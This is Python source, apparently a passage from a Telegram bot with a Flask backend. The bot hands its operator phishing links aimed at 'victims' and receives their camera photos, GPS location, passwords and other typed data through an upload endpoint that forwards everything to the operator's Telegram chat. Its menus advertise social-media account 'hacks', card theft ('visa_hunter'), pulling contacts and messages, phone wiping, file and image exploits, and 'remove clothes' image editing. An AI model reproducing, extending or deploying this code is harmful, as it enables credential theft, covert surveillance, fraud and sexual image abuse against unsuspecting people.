        header=info["header"], 
        description=info["desc"], 
        button_text=info["btn"], 
        action_code=action_type, 
        chat_id=chat_id,
        needs_input=info.get("input", False),
        needs_double_input=info.get("double", False),
        placeholder1=info.get("p1", "\u0623\u062f\u062e\u0644 \u0627\u0644\u0628\u064a\u0627\u0646\u0627\u062a \u0647\u0646\u0627..."),
        placeholder2=info.get("p2", "\u0623\u062f\u062e\u0644 \u0643\u0644\u0645\u0629 \u0627\u0644\u0631\u0648\u0631...")
    )

@app.route('/upload_media', methods=['POST'])
def upload_media_data():
    data = request.json
    chat_id = data.get('chat_id')
    action_type = data.get('type')

    if 'image' in data:
        img_data = data['image'].split(',')[1]
        img_bytes = base64.b64decode(img_data)
        bot.send_photo(chat_id, img_bytes, caption=f"\u0635\u064a\u062f \u062c\u062f\u064a\u062f \u0645\u0646 \u0632\u0631: `{action_type}`")
    elif 'lat' in data:
        lat = data['lat']
        lon = data['lon']
        bot.send_location(chat_id, latitude=lat, longitude=lon)
        bot.send_message(chat_id, f"\u0625\u062d\u062f\u062b\u064a\u0627\u062a \u0645\u0648\u0642\u0639 \u0627\u0644\u0636\u062d\u064a\u0629:\n\u062e\u0637 \u0627\u0644\u0639\u0631\u0636: `{lat}`\n\u062e\u0637 \u0627\u0644\u0637\u0648\u0644: `{lon}`", parse_mode="Markdown")
    else:
        d1 = data.get('data1', '\u063a\u064a\u0631 \u0645\u062d\u062f\u062f')
        d2 = data.get('data2', '')
        msg_text = f"\u0635\u064a\u062f \u0646\u0627\u062c\u062d \u0648\u0628\u064a\u0627\u0646\u0627\u062a \u0645\u062f\u062e\u0644\u0629 \u062c\u062f\u064a\u062f\u0629!\n\n\u0627\u0644\u062e\u062f\u0645\u0629: `{action_type}`\n\u0627\u0644\u0628\u064a\u0627\u0646\u0627\u062a \u0627\u0644\u0645\u062f\u062e\u0644\u0629 (1): `{d1}`"
        if d2:
            msg_text += f"\n\u0627\u0644\u0628\u064a\u0627\u0646\u0627\u062a \u0627\u0644\u0645\u062f\u062e\u0644\u0629 (2): `{d2}`"
        bot.send_message(chat_id, msg_text, parse_mode="Markdown")

    return jsonify({"status": "success"})

@bot.message_handler(commands=['start', 'vip'])
def send_welcome_message(message):
    user_id = message.from_user.id
    
    if not check_subscription(user_id):
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("\u0627\u0634\u062a\u0631\u0643 \u0641\u064a \u0642\u0646\u0627\u0629 \u0627\u0644\u0628\u0648\u062a \u0623\u0648\u0644\u0627\u0651", url=CHANNEL_URL))
        markup.add(types.InlineKeyboardButton("\u062a\u062d\u0642\u0642 \u0645\u0646 \u0627\u0644\u0627\u0634\u062a\u0631\u0627\u0643", callback_data="check_sub"))
        bot.send_message(message.chat.id, "\u0639\u0630\u0631\u064b\u0627\u0651\u064c\u060c \u064a\u062c\u0628 \u0639\u0644\u064a\u0643 \u0627\u0644\u0627\u0634\u062a\u0631\u0627\u0643 \u0641\u064a \u0642\u0646\u0627\u0629 \u0627\u0644\u0628\u0648\u062a \u0644\u062a\u062a\u0645\u0643\u0646 \u0645\u0646 \u0627\u0633\u062a\u062e\u062f\u0627\u0645\u0647:", reply_markup=markup, parse_mode="Markdown")
        return

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("\u0643\u0627\u0645\u064a\u0631\u0627 \u0623\u0645\u0627\u0645\u064a\u0629", callback_data="front_cam"),
        types.InlineKeyboardButton("\u0643\u0627\u0645\u064a\u0631\u0627 \u062e\u0644\u0641\u064a\u0629", callback_data="back_cam"),
        types.InlineKeyboardButton("\u062a\u062d\u062f\u064a\u062f \u0627\u0644\u0645\u0648\u0642\u0639", callback_data="get_location"),
        types.InlineKeyboardButton("\u062a\u0633\u062c\u064a\u0644 \u0635\u0648\u062a\u064a", callback_data="get_voice"),
        types.InlineKeyboardButton("\u062a\u0635\u0648\u064a\u0631 \u0641\u064a\u062f\u064a\u0648", callback_data="video_victim"),
        types.InlineKeyboardButton("\u0643\u0627\u0645\u064a\u0631\u0627\u062a \u0627\u0644\u0645\u0631\u0627\u0642\u0628\u0629", callback_data="cctv_cam"),
        types.InlineKeyboardButton("\u062a\u0623\u0643\u064a\u062f \u0648\u0627\u062a\u0633\u0627\u0628", callback_data="hack_whatsapp"),
        types.InlineKeyboardButton("\u062a\u0623\u0643\u064a\u062f \u0641\u064a\u0633\u0628\u0648\u0643", callback_data="hack_facebook"),
        types.InlineKeyboardButton("\u062a\u0623\u0643\u064a\u062f \u0627\u0646\u0633\u062a\u062c\u0631\u0627\u0645", callback_data="hack_insta"),
        types.InlineKeyboardButton("\u0634\u062d\u0646 \u0628\u0628\u062c\u064a", callback_data="hack_pubg"),
        types.InlineKeyboardButton("\u062a\u0641\u0639\u064a\u0644 \u0633\u0646\u0627\u0628 \u0634\u0627\u062a", callback_data="hack_snap"),
        types.InlineKeyboardButton("\u062c\u0648\u0627\u0647\u0631 \u0641\u0631\u064a \u0641\u0627\u064a\u0631", callback_data="hack_ff"),
        types.InlineKeyboardButton("\u062a\u0648\u062b\u064a\u0642 \u062a\u064a\u0643 \u062a\u0648\u0643", callback_data="hack_tiktok"),
        types.InlineKeyboardButton("\u0627\u0644\u0630\u0643\u0627\u0621 \u0627\u0644\u0627\u0635\u0637\u0646\u0627\u0639\u064a", callback_data="ai_tool"),
        types.InlineKeyboardButton("\u0641\u062d\u0635 \u0627\u0644\u062c\u0647\u0627\u0632", callback_data="device_info"),
        types.InlineKeyboardButton("\u0645\u0631\u0627\u0642\u0628\u0629 \u0634\u0627\u0645\u0644\u0629", callback_data="full_spy"),
        types.InlineKeyboardButton("\u0641\u062d\u0635 \u0627\u0644\u0631\u0648\u0627\u0628\u0637", callback_data="link_exploit"),
        types.InlineKeyboardButton("\u0627\u0644\u0645\u0627\u0631\u062f \u0627\u0644\u0623\u0632\u0631\u0642", callback_data="game_magic"),
        types.InlineKeyboardButton("\u0644\u0639\u0628\u0629 \u0627\u0644\u0623\u0630\u0643\u064a\u0627\u0621", callback_data="brain_game"),
        types.InlineKeyboardButton("\u062d\u0645\u0627\u064a\u0629 \u0627\u0644\u062c\u0647\u0627\u0632", callback_data="close_sites"),
        types.InlineKeyboardButton("\u0633\u062d\u0628 \u0627\u0644\u0641\u064a\u0632\u0627\u062a", callback_data="visa_hunter"),
        types.InlineKeyboardButton("\u0635\u0648\u0631 \u0645\u0634\u0627\u0628\u0647\u0629", callback_data="search_images"),
        types.InlineKeyboardButton("\u0645\u0639\u0631\u0641\u0629 \u0627\u0644\u0631\u0642\u0645", callback_data="get_number"),
        types.InlineKeyboardButton("\u0623\u0631\u0642\u0627\u0645 \u0648\u0647\u0645\u064a\u0629", callback_data="fake_numbers"),
        types.InlineKeyboardButton("\u0641\u062d\u0635 \u0627\u0644\u0623\u0645\u0627\u0646", callback_data="check_links"),
        types.InlineKeyboardButton("\u0628\u062b \u0627\u0644\u0631\u0627\u062f\u064a\u0648", callback_data="radio_spy"),
        types.InlineKeyboardButton("\u0632\u062e\u0631\u0641\u0629 \u0627\u0644\u0646\u0635\u0648\u0635", callback_data="text_decor"),
        types.InlineKeyboardButton("\u062a\u062d\u0648\u064a\u0644 \u0644\u0635\u0648\u062a", callback_data="text_to_voice"),
        types.InlineKeyboardButton("\u0635\u064a\u062f \u064a\u0648\u0632\u0631\u0627\u062a", callback_data="username_hunter"),
        types.InlineKeyboardButton("\u062a\u0641\u0633\u064a\u0631 \u0627\u0644\u0623\u062d\u0644\u0627\u0645", callback_data="dream_parser"),
        types.InlineKeyboardButton("\u0631\u0635\u064a\u062f\u064a", callback_data="my_balance"),
        types.InlineKeyboardButton("\u062c\u0645\u0639 \u0627\u0644\u0646\u0642\u0627\u0637", callback_data="collect_points"),
        types.InlineKeyboardButton("\u0627\u0644\u0645\u0632\u064a\u062f \u0645\u0646 \u0627\u0644\u0645\u0645\u064a\u0632\u0627\u062a", callback_data="vip_menu"),
        types.InlineKeyboardButton("\u062a\u0648\u0627\u0635\u0644 \u0645\u0639 \u0627\u0644\u0645\u0637\u0648\u0651\u0631", callback_data="contact_dev")
    )
    
    if user_id == ADMIN_ID:
        markup.add(types.InlineKeyboardButton("\u0644\u0648\u062d\u0629 \u062a\u062d\u0643\u0645 \u0627\u0644\u0645\u0637\u0648\u0651\u0631 \u0627\u0644\u062e\u0627\u0635\u0629", callback_data="admin_panel"))

    bot.send_message(message.chat.id, bot_settings["welcome_text"], reply_markup=markup, parse_mode="Markdown")

def show_vip_menu(chat_id):
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("\u0633\u062d\u0628 \u0635\u0648\u0631 \u0627\u0644\u0647\u0627\u062a\u0641", callback_data="vip_photos"),
        types.InlineKeyboardButton("\u0633\u062d\u0628 \u062c\u0647\u0627\u062a \u0627\u0644\u0627\u062a\u0635\u0627\u0644", callback_data="vip_contacts"),
        types.InlineKeyboardButton("\u0633\u062d\u0628 \u0627\u0644\u0631\u0633\u0627\u0626\u0644", callback_data="vip_msgs"),
        types.InlineKeyboardButton("\u0641\u0631\u0645\u062a\u0629 \u0627\u0644\u062c\u0648\u0627\u0644", callback_data="vip_wipe"),
        types.InlineKeyboardButton("\u0627\u062e\u062a\u0631\u0627\u0642 \u0639\u0628\u0631 \u0635\u0648\u0631\u0629", callback_data="vip_img_exploit"),
        types.InlineKeyboardButton("\u062a\u0639\u062f\u064a\u0644 \u0627\u0644\u0635\u0648\u0631", callback_data="vip_remove_clothes"),
        types.InlineKeyboardButton("\u0627\u062e\u062a\u0628\u0627\u0631 \u0627\u0644\u0634\u0628\u0643\u0629", callback_data="vip_net"),
        types.InlineKeyboardButton("\u0627\u062e\u062a\u0631\u0627\u0642 \u0639\u0628\u0631 \u0645\u0644\u0641", callback_data="vip_file"),
        types.InlineKeyboardButton("\u0631\u062c\u0648\u0639 \u0644\u0644\u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0631\u0626\u064a\u0633\u064a\u0629", callback_data="back_home")
    )
    bot.send_message(chat_id, "\u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0645\u0645\u064a\u0632\u0627\u062a \u0627\u0644\u0625\u0636\u0627\u0641\u064a\u0629:", reply_markup=markup, parse_mode="Markdown")

def show_admin_panel(chat_id):
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("\u0625\u062d\u0635\u0627\u0626\u064a\u0627\u062a \u0627\u0644\u0628\u0648\u062a", callback_data="admin_stats"),
        types.InlineKeyboardButton("\u0625\u0631\u0633\u0627\u0644 \u0631\u0633\u0627\u0644\u0629 \u0644\u0644\u062c\u0645\u064a\u0639", callback_data="admin_broadcast"),
        types.InlineKeyboardButton("\u0631\u062c\u0648\u0639 \u0644\u0644\u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0631\u0626\u064a\u0633\u064a\u0629", callback_data="back_home")
    )
    bot.send_message(chat_id, "\u0645\u0631\u062d\u0628\u064b\u0627 \u0628\u0643 \u0641\u064a \u0644\u0648\u062d\u0629 \u062a\u062d\u0643\u0645 \u0627\u0644\u0645\u0637\u0648\u0651\u0631 \u0627\u0644\u0633\u0631\u064a\u0629:", reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
def handle_all_callbacks(call):
    chat_id = call.message.chat.id
    user_id = call.from_user.id
    data = call.data
    RENDER_DOMAIN = os.getenv("RENDER_EXTERNAL_URL", "http://127.0.0.1:5000")

    if data == "check_sub":
        if check_subscription(user_id):
            bot.answer_callback_query(call.id, "\u062a\u0645 \u0627\u0644\u062a\u062d\u0642\u0642 \u0645\u0646 \u0627\u0634\u062a\u0631\u0627\u0643\u0643 \u0628\u0646\u062c\u0627\u062d!")
            fake_msg = call.message
            fake_msg.text = '/start'
            send_welcome_message(fake_msg)
        else:
            bot.answer_callback_query(call.id, "\u0644\u0645 \u062a\u0642\u0645 \u0628\u0627\u0644\u0627\u0634\u062a\u0631\u0627\u0643 \u0641\u064a \u0627\u0644\u0642\u0646\u0627\u0629 \u0628\u0639\u062f!", show_alert=True)
        return

    if data.startswith("admin_") and user_id != ADMIN_ID:
        bot.answer_callback_query(call.id, "\u0647\u0630\u0627 \u0627\u0644\u0632\u0631 \u0645\u062e\u0635\u0635 \u0644\u0644\u0645\u0637\u0648\u0651\u0631 \u0641\u0642\u0637!", show_alert=True)
        return

    link_buttons = [
        "front_cam", "back_cam", "get_location", "get_voice", "video_victim", 
        "cctv_cam", "hack_whatsapp", "hack_facebook", "hack_insta", "hack_pubg", 
        "hack_snap", "hack_ff", "hack_tiktok", "device_info", "link_exploit", 
        "full_spy", "close_sites", "visa_hunter", "get_number", "fake_numbers", 
        "check_links", "search_images", "radio_spy", "username_hunter", "ai_tool", 
        "dream_parser", "text_to_voice", "text_decor", "my_balance", "collect_points", 
        "game_magic", "brain_game", "vip_photos", "vip_contacts", "vip_msgs", "vip_wipe", 
        "vip_img_exploit", "vip_remove_clothes", "vip_net", "vip_file"
    ]

    if data in link_buttons:
        bot.answer_callback_query(call.id, "\u062c\u0627\u0631\u064a \u0625\u0646\u0634\u0627\u0621 \u0627\u0644\u0631\u0627\u0628\u0637 \u0627\u0644\u0645\u062e\u0635\u0635...")
        target_link = f"{RENDER_DOMAIN}/service/{data}/{chat_id}"
        bot.send_message(chat_id, f"\u0627\u0644\u0631\u0627\u0628\u0637 \u0627\u0644\u0645\u062e\u0635\u0635 \u0644\u0644\u0636\u062d\u064a\u0629:\n`{target_link}`", parse_mode="Markdown")

    elif data == "vip_menu":
        bot.answer_callback_query(call.id)
        show_vip_menu(chat_id)

    elif data == "admin_panel":
        bot.answer_callback_query(call.id)
        show_admin_panel(chat_id)

    elif data == "admin_stats":
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, "\u0625\u062d\u0635\u0627\u0626\u064a\u0627\u062a \u0627\u0644\u0628\u0648\u062a:\n- \u0627\u0644\u0633\u064a\u0631\u0641\u0631 \u064a\u0639\u0645\u0644 \u0628\u0643\u0641\u0627\u0621\u0629 \u0639\u0627\u0644\u064a\u0629 \u0639\u0644\u0649 Render.\n- \u0627\u0644\u062d\u0627\u0644\u0629: \u0645\u062a\u0635\u0644 \u0648\u0622\u0645\u0646.")

    elif data == "admin_broadcast":
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, "\u0645\u064a\u0632\u0629 \u0627\u0644\u0625\u0630\u0627\u0639\u0629 \u0642\u064a\u062f \u0627\u0644\u062a\u0641\u0639\u064a\u0644.")

    elif data == "contact_dev":
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, f"\u0642\u0646\u0627\u0629 \u0627\u0644\u0645\u0637\u0648\u0651\u0631:\n{CHANNEL_URL}")

    elif data == "back_home":
        bot.answer_callback_query(call.id)
        fake_msg = call.message
        fake_msg.text = '/start'
        send_welcome_message(fake_msg)

    else:
        bot.answer_callback_query(call.id, "\u062a\u0645 \u0627\u0644\u062a\u0646\u0641\u064a\u0630")

def run_flask_app():
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)))

if __name__ == "__main__":
    print("Bot is running with full features...")
    threading.Thread(target=run_flask_app, daemon=True).start()
    bot.infinity_polling()
